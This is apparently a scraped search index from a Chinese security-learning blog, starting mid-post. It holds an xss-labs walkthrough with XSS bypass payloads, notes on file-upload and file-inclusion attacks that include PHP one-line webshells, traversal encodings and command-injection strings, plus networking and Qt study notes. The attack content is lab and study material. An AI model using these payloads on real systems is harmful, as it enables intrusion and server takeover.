onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;需要点击搜索框&quot; onclick&#x3D;alert(1) &gt;&quot; onclick&#x3D;alert(1) &quot; level3这关进行了实体转义，也就是过滤了&lt;&gt;和””,所以我们可以利用单引号和注释符 其中转义函数 12&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F; level4和上一关一样，但需要注意的是双引号 1234&quot; onclick&#x3D;alert(1) &quot;&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F; level5这个关卡过滤了on，但没有过滤单双引号，所以可以用伪协议 1234&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt; level6script 转换成 scr_ipt on 转换成 o_n src 转换成 sr_c data 转换成 da_ta href 转换成 hr_ef 但可以大小写绕过 1234&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;&quot; Onclick&#x3D;alert(1) &quot; level7过滤了script，on，href 所以可以双写绕过 12&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F; level8script,on，src，data，href，大小写失效，”被编码所以value处几乎找不到 但下面链接处可以看到 &lt;&gt; ‘ % # &amp; 未被过滤 看了别人题解之后是html实体编码绕过 12javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) level9不了解，去看了源码是得加http:// 1javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F; level10这真想不出来 试了三个参数，发现只有最后一个可以写入，直接构造 12&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F; level11这个题应该是抓包看，但由于我是谷歌做题，火狐抓包，导致每次直接复制11题url它都不会直接抓到ref头，正确应该是在10题向11题跳转时抓包。 1&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F; 把ref头改成这个，发包即可 level12有了上一个题的提示，这个题就明显很多了 只要改一下UA头 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F; level13这个应该是改cookie 1__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F; level14链接好像是挂掉了，但好像是没有太看懂，回头再来看一下 level15看源码发现 然后上网查一下 ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。 payload： 1?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39; 1&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt; 也就是说src包含的内容会进入ng-include被包含 那我们可以想出能不能直接闭合 1?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt; 但发现直接被转义了，所以还是不行，只能包含第一关代码 level16这个题是把空格过滤了 用%0d和%0a绕过 %0a换行符号”\\n”%0d回车符号”\\r” 12&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt; level17就找源码和url之间的关系 可以看见在src处有不同 &lt;&gt;被过滤，考虑on事件 1?arg02&#x3D; onmouseover&#x3D;alert(1) level18和17关一样 1?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1) 1234567- 反引号代替圆括号- 换行绕过正则- &lt;!--不仅可以用--&gt;,也可以用--!&gt;闭合- &#x2F;&#x2F;可以用换行来绕过- &lt;!--和--&gt;都可以在html的script标签里单独使用进行单行注释- ſ 符号转换为大写后正好为大写字母 S- 可以用 %0a 代替空格进行绕过","categories":[{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"},{"name":"xss","slug":"xss","permalink":"https://pz1o.top/tags/xss/"}]},{"title":"计网","slug":"计网","date":"2020-12-09T15:29:40.000Z","updated":"2020-12-09T15:32:12.091Z","comments":true,"path":"2020/12/09/计网/","link":"","permalink":"https://pz1o.top/2020/12/09/%E8%AE%A1%E7%BD%91/","excerpt":"","text":"这个只有这一部分了 后面学了但好像丢了 看多会学到计网时，再来补这一篇 计网初学TCP/IP分层模型 应用层（第五层) 传输层（第四层） 互联网层（第三层） 网路接口层（第二层） 物理层（第一层） 物理层：对应于网络的基本硬件，即我们可以看得见的硬件设备。 网络接口层：定义了将数据组成正确帧的规程和在网络中传输帧的规程。 互联网层：本层定义了互联网中传输的信息包的格式，以及从一个用户通过一个或多个路由器到最终目标的信息包转发机制。 传输层：为两个用户进程之间建立，管理和拆除可靠而又有效的端到端的连接。 应用层：定义了应用程序使用互联网的规程。 IP地址ip地址分为两部分：网络标识和主机标识 网络标识：用以标明具体的网络段 主机标识：某个网络中待定的计算机号码 网络标识：210.73.140.0 主机标识： 2 合起来写：210.73.140.2 人们按照网络规模的大小，把32为地址信息设成3种定位的划分方式，三种划分方法分别对应于A，B，C类IP地址，IP地址分为网络号和主机号两部分 （1）A类IP地址（1-126） 该地址由1字节网络地址和3字节主机地址组成，网络地址最高位必须是0。 （2）B类IP地址（128-191） 该地址由2字节网络地址和2字节主机地址组成，网络地址最高位必须是10。 （3）C类IP地址（192-223） 该地址由3字节网络地址和1字节主机地址组成，网络地址最高位必须是110。 （4）D类IP地址（224-239） 多点广播地址，用于IP组播。 （5）E类IP地址（240-225） 保留地址，用作特殊用途。 （0.0.0.0）对应当前主机，（255.255.255.255）是当前子网的传播地址。 域名顶级域名 .com 二级域名 test.com 三级域名 test.cn.com DNS服务器 计网学习第一章 计算机网络概述局域网：覆盖范围小 自己花钱买设备 带宽固定 广域网：距离远 花钱买服务 Internet ：有自己的机房 对网民提供连接。 IP地址：网络中的地址。 物理地址：Mac地址，电脑出厂时已固定。 网关：下图中的G就是网关，相当于网络中的一个关卡。网关地址为G的IP地址。 本机ip 访问ip 本机mac 下次访问mac 15.0.0.2 13.0.0.2 m4 m5 OSI参考模型 应用层：能产生网络流量的程序 表示层：在传输之前是否加密或压缩处理 会话层：查正在进行会话的程序 netstat -nb 传输层：可靠传输（TCP）和流量控制 不可靠传输（UDP） 网络层：选择最佳路径 规划IP地址 数据链路层：帧的开始和结束。差错检查。 物理层：接口标准和电器标准 OSI参考模型网络排错指导 物理层故障：查看连接状态，发送和接受的数据包 数据链路层：MAC地址冲突、网速协商不一致、计算机VLAN错误 网络层故障：配置错误的IP地址 子网掩码和错误的网关 应用层故障：应用错误代理。 检查网络是否通畅：ping一个网址 OSI参考模型和网络安全 物理层安全 数据链路层安全：登录需要账号和密码 网络层安全：路由器限制数据包流量 应用层安全：开发程序有没有漏洞 第二章 物理层0x01物理层的基本概念物理层解决如何连接在各种计算机的传输媒体上传输数据比特流，不是指具体的传输媒体。 物理层主要是确定传输媒体的接口的一些特性。有机械，电器，功能，过程特性。 0x02数据通信知识数据通信模型： 数据：运送消息的实体。 信号：数据电气或电磁的表现。 信道：表示一个方向传送信息的媒体。 单向通信，双向交替通信，双向同时通信。 0x03物理层下面的传输媒体无屏蔽双绞线UTP 屏蔽双绞线STP 同轴电缆 光纤 微波传输 物理层设备—集线器 0x04信道复用技术 0x05数字传输系统0x06宽带接入技术ADSL 光纤 第三章数据链路层0x01数据链路层基本概念 数据链路层信道类型：点到点和广播。 链路：是一条点到点的物理线路段。 数据链路：除了物理线路外，还必须有通信协议来控制这些数据的传输。 帧：帧头 帧尾 mac地址 校验码 0x02数据链路层的三个基本问题1.封装成帧 2.透明传输（将转义字符转义） 3.差错控制 传的数据为101001001/1101余数为0就会接受。 0x03两种情况下的数据链路层点到点信道的数据链路层（广域网） PPP协议 广播信道的数据链路层（集线器） 0x04以太网以太网是一种CSMA/CD的局域网 媒体接入控制层（MAC ） FCS抓包之后会删掉。 0x05扩展以太网集线器级联，会使网络中计算机数量增加，但会使冲突域增大，如何优化呢？ 网桥 网桥就是交换机的前身，交换机相当于网桥和集线器。 0x06高速以太网第四章 网络层0x01网络层提供的服务 （路由器是网络层设备） 网络地址相同就可以看成一个网段，怎么看网络地址呢？可以看子网掩码 1234567891011ip:10.0.0.1子网掩码:255.0.0.0&#x2F;&#x2F;此时，我们可以看出子网掩码是255，那表明ip地址中10就是网络地址。ip:12.0.0.1子网掩码255.255.0.0&#x2F;&#x2F;255.255.0.0说明在这个网段中12.0是网络地址网关：路由器上配置，一般为该网段中的第一个地址，实际上任意一个地址都可以。路由器：路由器是无法知道它具体网段的位置，需要添加路由表。 0x02网络设备和OSI参考模型发送端： 应用层 程序准备要传输的文件 传输层 将文件编号 网络层 添加IP地址 数据链路层 有两种情况 第一种 通过子网掩码 ，判断是否是同一个网段。如果是，利用ARP协议广播解析目标ip地址的MAC地址 第二种 0x03网络层协议ARP协议 12arp -a &#x2F;&#x2F;查询mac地址arp -s ip地址 mac地址 &#x2F;&#x2F;配置IP地址的MAC地址 arp协议:将ip地址通过广播 目标MAC地址是FF-FF-FF-FF-FF-FF解析目标ip地址的MAC地址 arp欺骗: 数据链路层故障，缓存了错误的MAC地址 网际控制报文协议（ICMP）123456789ping ttl&#x3D;64 linux 128 windows 255 unixping www.baidu.com -t 一直pingping www.baidu.com -l 200 定义数据包的大小&#x2F;&#x2F;查看路由器的地址ping 8.8.8.8 -i 1 更改数据包ttl时间，可以跟踪途经的路由器pathping 跟踪ping的路径tracert 直接跟踪路由 IGMP配置在路由器上扫描多播地址的协议 广播：目标ip地址是全ff，目标mac地址是255，向局域网内所有计算机发出广播 点到点：从一个点到另一个点 组播：一对多 0x04数据包 版本：用来表示TCP/IP协议的版本 v4 v6 区分服务：看谁的优先级高 标识：100 100 100就为一个数据包 标志：看数据包是否分片 生存时间（TTL）：每过一个路由器，生存时间会修改。 协议号：交给哪个协议进行处理 （ICMP 1 IGMP 2 TCP 6 UDP 17 IPv6 41 OSPF 89） 数据链路层支持数据包1500字节 IP层支持数据包是65535字节，所以需要分片传输，但一般不会超过1500字节。 FTP Active Mode 第二信道是服务器主动发起的。 第一信道是21端口 第二信道是20端口 Passive 第一信道是21端口 第二信道是随机端口 Telnet telnet的端口是23端口 SSH","categories":[{"name":"计网","slug":"计网","permalink":"https://pz1o.top/categories/%E8%AE%A1%E7%BD%91/"}],"tags":[{"name":"计网","slug":"计网","permalink":"https://pz1o.top/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"文件上传","slug":"文件上传","date":"2020-12-09T15:26:33.000Z","updated":"2020-12-09T15:27:06.160Z","comments":true,"path":"2020/12/09/文件上传/","link":"","permalink":"https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"上传漏洞https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/ 0x01基本流程 图片是否正常上传。 图片上传内容是否被感染。（内容替换 抓包改） 上传的域名是否是目标服务器。 上传的目录是否支持解析 0x02绕过js0x03文件上传空字节抓包的时候 %00 121.jpg%00.php1.php%00.jpg 0x04文件上传名单验证黑名单：不允许什么上传 白名单：允许什么上传 可以尝试php3 php4 php5 phtml，pht使用 或服务器解析漏洞 0x05二次上传0x06MIMEcontent-type中表示了文件类型。 0x07解析漏洞iis解析漏洞 apache解析漏洞 nginx解析漏洞 .net上传 phtml上传在apache配置文件中添加（httpd.conf）中添加 AddType application/x-httpd-php.phtml 这样phtml后缀的文件就会按照php去解析 .htaccess上传12345678910&lt;Files *.jpg&gt;ForceType:application&#x2F;x-httpd-phpSetHandler:application&#x2F;x-httpd-php&lt;&#x2F;Files&gt;&#x2F;&#x2F;1.jpg&lt;?phpphpinfo();?&gt;&#x2F;&#x2F;会将所有的jpg文件都按照php来解析 0x08双文件上传","categories":[{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"}]},{"title":"文件包含","slug":"文件包含","date":"2020-12-09T15:21:27.000Z","updated":"2020-12-09T15:23:42.040Z","comments":true,"path":"2020/12/09/文件包含/","link":"","permalink":"https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"今天在整理硬盘的一些东西，有些web学的东西又不想扔，就传上来。 文件包含0x01定义在通过服务器脚本的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。 0x02环境要求 allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据 allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件 0x03文件包含函数 include():可获得指定文件中的所有文本，并把文本拷贝到使用 include 函数的文件中。include() 函数会生成一个警告，但是脚本会继续执行。 require():函数接受的所有文本文件,并将它复制到指定的文件中，使用了包括功能。如果在加载一个文件时有任何问题，生成一个致命错误,停止脚本的执行。 0x04命令执行https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21 定义应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。 利用条件 应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严 常用连接符 在Windows和Linux中我们可以使用&amp;来执行多条命令。 |：前面命令输出结果作为后面命令的输入内容；输入8.8.8.8|whoami ||：前面命令执行失败的时候才执行后面的命令 &amp;&amp;：前面命令执行成功了才执行后面的命令 在Linux中还可以用；号来连接。 常见命令执行函数 system：成功执行返回结果的最后一行，否则返回FALSE exec：成功执行返回结果的最后一行 shell_exec：成功执行返回全部结果，否则返回NULL passthru ：把命令的运行结果原样地直接输出到标准输出设备上 漏洞利用读取指定目录内容 1...|dir C:\\user 读取指定文件内容 18.8.8.8|type C:\\windows\\win.ini 0x05php伪协议PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://inputphp://input:可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容，从而导致任意代码执行。 在ctf中，php://input用于执行php代码。 通常会有两种类型： 任意代码执行 文件内容绕过 1&lt;?php fputs(fopen(“shell.php”,”w”),’&lt;?php eval($_POST[&quot;cmd&quot;];?&gt;’);?&gt; php://filterphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。 12?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php zip://zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 123使用方法zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txtzip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] 12345http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.jpg%23phpcode.txt先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。 data://和phar://data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。 12345data:&#x2F;&#x2F;[MIME-type][;charset&#x3D;&lt;encoding&gt;][;base64],&lt;data&gt;?file&#x3D;data:&#x2F;&#x2F;&lt;?php phpinfo()?&gt;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; phar:// 有点类似zip://同样可以导致 任意代码执行。 12?file&#x3D;phar:&#x2F;&#x2F;zip.jpg&#x2F;cmd.php?file&#x3D;phar:&#x2F;&#x2F;D:\\zip.jpg\\cmd.php 0x06包含Apache日志文件WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。 利用条件： 对日志文件可读 知道日志文件的存储目录 12 Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。 如果访问一个不存在的资源时，如http:&#x2F;&#x2F;www.xxxx.com&#x2F;&lt;?php phpinfo(); ?&gt;,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把&lt;?php phpinfo(); ?&gt; 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。 0x07包含SESSION可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。 利用条件： 找到SESSION内的可控变量 SESSION文件可读写，并且知道存储路径 php的session文件的保存路径可以在phpinfo的session.save_path看到。 0x08包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 0x09包含上传文件很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。 1234567图片马的制作方式如下，在cmd控制台下输入：进入1.jpg和2.php的文件目录后，执行：copy 1.jpg&#x2F;b+2.php 3.jpg将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg 12345假设已经上传一句话图片木马到服务器，路径为&#x2F;upload&#x2F;201811.jpg图片代码如下：&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#39;pass&#39;]);?&gt;&quot;)?&gt;然后访问URL：http:&#x2F;&#x2F;www.xxxx.com&#x2F;index.php?page&#x3D;.&#x2F;upload&#x2F;201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php 绕过方法0x10指定前缀绕过目录遍历使用../../返回上一目录，称为目录遍历 1?file&#x3D;..&#x2F;..&#x2F;Flag&#x2F;flag.txt 测试代码 12345678&lt;?php error_reporting(0); $file = $_GET[\"file\"]; //前缀 include \"/var/www/html/\".$file; highlight_file(__FILE__);?&gt; 编码绕过 url编码 123456789..&#x2F;%2e%2e%2f..%2f%2e%2e&#x2F;..\\%2e%2e%5c..%5c%2e%2e\\ 二次编码 12345..&#x2F;%252e%252e%252f..\\%252e%252e%255c 容器/服务器编码 123456..&#x2F;..%c0%af%c0%ae%c0%ae&#x2F;..\\..%c1%9c 0x11指定后缀绕过后缀测试代码 12345678&lt;?php error_reporting(0); $file = $_GET[\"file\"]; //后缀 include $file.\".txt\"; highlight_file(__FILE__);?&gt; 利用url完整url格式： 1protocol :&#x2F;&#x2F; hostname[:port] &#x2F; path &#x2F; [;parameters][?query]#fragment query(?) 1234&#x2F;&#x2F;拼接参数?file&#x3D;http:&#x2F;&#x2F;localhost:8080&#x2F;phpinfo.php?&#x2F;&#x2F;拼接后?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php?.txt fragment(#) 1234&#x2F;&#x2F;拼接参数?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php%23&#x2F;&#x2F;拼接后?file&#x3D;http:&#x2F;&#x2F;localhost:8081&#x2F;phpinfo.php#.txt 利用协议zip:// 1234&#x2F;&#x2F;拼接参数?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]%23phpinfo&#x2F;&#x2F;拼接后?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]%23phpinfo.txt phar:// 1234&#x2F;&#x2F;拼接参数?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo&#x2F;&#x2F;拼接后?file&#x3D;phar:&#x2F;&#x2F;php.zip&#x2F;phpinfo.txt 长度截断利用条件： php版本 &lt; php 5.2.8 原理： Windows下目录最大长度为256字节，超出的部分会被丢弃 Linux下目录最大长度为4096字节，超出的部分会被丢弃。 利用方法： 只需要不断的重复 ./(Windows系统下也可以直接用 . 截断) 12 ?file&#x3D;.&#x2F;.&#x2F;.&#x2F;。。。省略。。。.&#x2F;.&#x2F;shell.php1 则指定的后缀.txt会在达到最大值后会被直接丢弃掉 %00截断利用条件： magic_quotes_gpc = Off php版本 &lt; php 5.3.4 利用方法： 直接在文件名的最后加上%00来截断指定的后缀名 12 ?file&#x3D;shell.php%001 注：现在用到%00阶段的情况已经不多了 0x12通过phpinfo去Getshellhttps://cloud.tencent.com/developer/article/1609810 phpinfo文件泄露一直被大家所忽视，但其实phpinfo可以为攻击渗透测试人员提供很多的信息。 1.system 提供服务器所在的操作系统的信息。 2.真实ip 知道真实ip的我们可以省去cdn带来的各种困扰。我们同时也可以端口旁站一顿操作。 3.web根目录 网站绝对路径对渗透测试相当的有用，当你找到SQL注入点时，要上传木马的时候就需要知道网站的绝对路径才可以获取webshell。假如该网站使用的是如xampp之类的快速搭建的软件，你便可以寻找该软件对应的漏洞去尝试攻击目标网站。 disable_functions 通过disable_functions你可以了解到该网站禁用了些什么函数，然后去绕过代码执行和编写webshell时遇到的问题。 临时文件路径 这次通过phpinfo来getshell的关键，phpinfo可以让我们获得临时文件路径。向phpinfo页面post恶意代码，可以在_FILES[“file1”]中看到上传的临时文件，如果该网站存在文件包含漏洞，便可以将恶意代码存储我们已知的绝对路径去包含它getshell。","categories":[{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"},{"name":"文件包含","slug":"文件包含","permalink":"https://pz1o.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"大二程序设计综合实践","slug":"大二程序设计综合实践","date":"2020-12-07T06:32:17.000Z","updated":"2020-12-14T00:41:59.076Z","comments":true,"path":"2020/12/07/大二程序设计综合实践/","link":"","permalink":"https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/","excerpt":"","text":"程序设计综合实践图形化编程 这不同语言分数还不太一样，最后用Qt了 四个星期四个实验，应该问题不大 趁下次比赛之前把这个实验弄完 先贴链接 https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046 下面尽量用代码和注释介绍基础知识，写得有点乱，可以看b站去学 主要是自己记录一下知识 我用的是5.14的 b站应该是5.5的 有些知识会有点出入 Qt0x01 创建qt项目安装完成后 可以先看一下上面这个内容 1.新建项目选第一个 一直默认，直到选类名 之后一直默认就可以了 最终界面如图 2. .pro文件1234567QT += core gui //包含的模块greaterThan(QT_MAJOR_VERSION, 4): QT += widgets //大于Qt4版本 才包含widget模块TARGET = QtFirst //应用程序名 生成的.exe程序名称TEMPLATE = app //模板类型 应用程序模板SOURCES += main.cpp\\ //源文件 mywidget.cppHEADERS += mywidget.h //头文件 \\.pro就是工程文件(project)，它是qmake自动生成的用于生产makefile的配置文件**。 3.main.cpp1234567891011121314#include \"mainwindow.h\"#include &lt;QApplication&gt;int main(int argc, char *argv[])&#123; //a 应用程序对象 在Qt中 有且仅有一个 QApplication a(argc, argv); //窗口对象 MainWindow MainWindow w; //必须要show方法才可以展示 w.show(); return a.exec();&#125; 解释： Qt系统提供的标准类名声明头文件没有.h后缀 Qt一个类对应一个头文件，类名就是头文件名 QApplication应用程序类 管理图形用户界面应用程序的控制流和主要设置。 是Qt的整个后台管理的命脉它包含主事件循环**，在其中来自窗口系统和其它资源的*所有事件处理和调度。它也处理应用程序的初始化和结束，并且提供对话管理。 对于任何一个使用Qt的图形用户界面应用程序，都正好存在一个QApplication 对象，而不论这个应用程序在同一时间内是不是有0、1、2或更多个窗口。 a.exec() 程序进入消息循环，等待对用户输入进行响应。这里main()把控制权转交给Qt，Qt完成事件处理工作，当应用程序退出的时候exec()的值就会返回。在exec()中，Qt接受并处理用户和系统的事件并且把它们传递给适当的窗口部件。 4.快捷键及命名规范1234567891011//命名规范 //类名 首字母大写，单词和单词之间首字母大写//函数名 首字母小写//ctrl + / 注释//ctrl + r 运行//ctrl + b 编译//f1 帮助文档//ctrl + shift + 上 上移//ctrl + i 对齐//f4 切换.cpp 和 .h 0x02 新建Qt程序1.QPushButton创建按钮 把下面这段代码复制到widget.cpp 1234567891011121314151617181920212223242526272829#include&lt;QPushButton&gt;&#123; //按钮操作 //创建第一个按钮 QPushButton * btn = new QPushButton; //show以顶层方式弹出控件 btn-&gt;show(); //设置父亲 btn-&gt;setParent(this); //显示文本 btn-&gt;setText(\"第一个\"); //此外还有第二种方法进行操作 //创建第二个按钮 //按照控件大小创建窗口 QPushButton * btn2 = new QPushButton(\"第二个\",this); //移动btn2按钮 btn2-&gt;move(100,100); //重置按钮大小 btn2-&gt;resize(50,50); //窗口操作 //重置窗口大小 resize(600,400); //设置固定窗口大小 //setFixedSize(600,400); //设置窗口标题 setWindowTitle(\"计算器\");&#125; 2.对象树 自己创建一个MyPushButton 同时继承QPushButton 代码如下 mypushbutton.cpp 1234567891011121314#include \"mypushbutton.h\"#include &lt;QDebug&gt;MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)&#123; qDebug() &lt;&lt; \"按钮构造调用\";&#125;MyPushButton::~MyPushButton()&#123; qDebug() &lt;&lt; \"按钮构造析构\";&#125; mypushbutton.h 12345678910111213141516#ifndef MYPUSHBUTTON_H#define MYPUSHBUTTON_H#include &lt;QWidget&gt;#include&lt;QPushButton&gt;class MyPushButton : public QPushButton&#123; Q_OBJECTpublic: explicit MyPushButton(QWidget *parent = nullptr); ~MyPushButton();signals:&#125;;#endif // MYPUSHBUTTON_H widget.cpp 123456//创建自己按钮对象MyPushButton *btn3 = new MyPushButton;btn3-&gt;show();btn3-&gt;setParent(this);btn3-&gt;setText(\"我的按钮\");btn3-&gt;move(200,100); 图示如下 0x03 信号和槽的机制1.信号和槽 基本的接口 123&#x2F;&#x2F;给我的按钮一个关闭窗口的功能&#x2F;&#x2F;参数1 信号发送者 参数2 发送的信号(函数地址) 参数3 信号接收者 参数4 处理的槽函数connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close); 自定义信号和槽自定义信号 123456//类的.h文件下signals: //自定义信号 写在signals下 //返回值是void 只需要声明 不需要实现 //可以有参数，可以重载 void rang(); 自定义槽 123456789101112//类的.文件public中public //返回值是void 需要声明 需要实现 //可以有参数，可以重载 void recv();//实现在类的.cpp中实现void MyPushButton::recv()&#123; qDebug() &lt;&lt; \"接受成功\";&#125; 接下来进行一个小的案例 一个按钮响起之后 程序输出接受成功 我们首先得有两个类 button recv 然后得有信号 槽函数 定义槽函数 12345678910111213//button.hsignals: void rang();//recv.hpublic: void recvsignals();//recv.cppvoid recv::recvsignals()&#123; qDebug() &lt;&lt; \"接受成功\";&#125; 最后就是连接,这里我们需要注意只有rang之后才会接受 所以就需要rang起来，这里用的plz函数让它rang 其中的一些成员名需要在widget.h中是实现 12345678910111213141516171819202122//widget.hpublic: Widget(QWidget *parent = nullptr); void plz(); ~Widget();private: MyPushButton * btn; recv * recv1;//widget.cpp this-&gt;btn = new MyPushButton(this); this-&gt;recv1 = new recv; btn-&gt;show(); btn-&gt;setParent(this); btn-&gt;setText(\"我的按钮\"); btn-&gt;move(0,0); connect(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals); plz();void Widget::plz()&#123; emit btn-&gt;rang();&#125; 2.重载信号和槽接着上个案例 重载信号 重载槽 重新定义槽函数 